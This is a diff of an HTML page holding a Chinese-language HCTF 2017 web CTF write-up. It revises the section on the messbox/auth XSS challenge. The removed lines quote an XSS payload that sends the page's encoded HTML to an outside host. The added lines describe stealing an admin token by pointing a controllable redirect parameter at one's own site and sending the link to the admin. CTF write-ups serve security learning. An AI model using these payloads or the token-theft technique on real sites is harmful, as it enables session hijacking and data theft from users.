@@ -15,7 +15,7 @@
 <meta property="og:description" content="Level-1easy_sign_in登陆之后chrome说您的链接不是私密连接，查看证书，证书中提示flag在某个ip中，访问就可以得到flag。  Level-2boring website用我自己写的扫源码神器biubiubiu扫出http://106.15.53.124:38324/www.zip 之后是一个注入，在源码中有两个提示：OOB和server link。刘师傅想了一下午决定使用">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="http://hebic.me/2017/11/13/hctf2017-web-writeup/1.png">
-<meta property="og:updated_time" content="2017-11-15T07:30:54.344Z">
+<meta property="og:updated_time" content="2017-11-15T11:20:02.958Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="hctf2017 web writeup">
 <meta name="twitter:description" content="Level-1easy_sign_in登陆之后chrome说您的链接不是私密连接，查看证书，证书中提示flag在某个ip中，访问就可以得到flag。  Level-2boring website用我自己写的扫源码神器biubiubiu扫出http://106.15.53.124:38324/www.zip 之后是一个注入，在源码中有两个提示：OOB和server link。刘师傅想了一下午决定使用">
@@ -161,8 +161,8 @@
 <p>比赛环境已经关掉了，凭记忆写一点。</p>
 <p>这道题的环境开着CSP，在default-src部署了nonce，nonce是必须脚本待着nonce-xxxxx才可以执行的一种白名单机制，由于每一次nonce都不一样，所以注入进的script标签无法猜测nonce导致无法执行。</p>
 <p>这道题有两个域名：</p>
-<p><a href="http://messbox.2017.hctf.io/" target="_blank" rel="external">http://messbox.2017.hctf.io/</a> 和 <a href="http://auth.2017.hctf.io/" target="_blank" rel="external">http://auth.2017.hctf.io/</a> ，后者为身份认证平台，分发token，利用token登陆。在输入用户名密码之后，auth会利用js的location跳转到messbox，url大致是：<a href="http://auth.2017.hctf.io/login.php?n_url=messbox.2017.hctf.io/index.php" target="_blank" rel="external">http://auth.2017.hctf.io/login.php?n_url=messbox.2017.hctf.io/index.php</a> messbox.2017.hctf.io拼接在内置的script标签中，因此这里可以直接xss，就不需要考虑nonce了。但是cookie做了http onley，试着读了一下domain读出来了。之后就没有什么好的方法了。柠檬叔叔是这么写的<code>http://auth.2017.hctf.io/login.php?n_url=&#39;;stop();location=&#39;http://rootk.pw:8080/&#39;+btoa(document.documentElement.outerHTML);//</code> 再url编码一下就可以了。</p>
-<p>我要是早知道可以这样读源码就好了T^T</p>
+<p><a href="http://messbox.2017.hctf.io/" target="_blank" rel="external">http://messbox.2017.hctf.io/</a> 和 <a href="http://auth.2017.hctf.io/" target="_blank" rel="external">http://auth.2017.hctf.io/</a> ，后者为身份认证平台，分发token，利用token登陆。这道题目的考点是，登陆验证是用token验证。如果获得管理员token就可以利用管理员身份登陆。在输入用户名密码之后会进入，auth会利用js的location跳转到messbox，url大致是：<a href="http://auth.2017.hctf.io/login.php?n_url=messbox.2017.hctf.io/index.php&amp;token=xxxxxx" target="_blank" rel="external">http://auth.2017.hctf.io/login.php?n_url=messbox.2017.hctf.io/index.php&amp;token=xxxxxx</a> 由于n_url可控，所以把n_url替换成自己的网址，发给管理员。管理员必然有token。</p>
+<p>getflag</p>
 
   </div>
 </article>
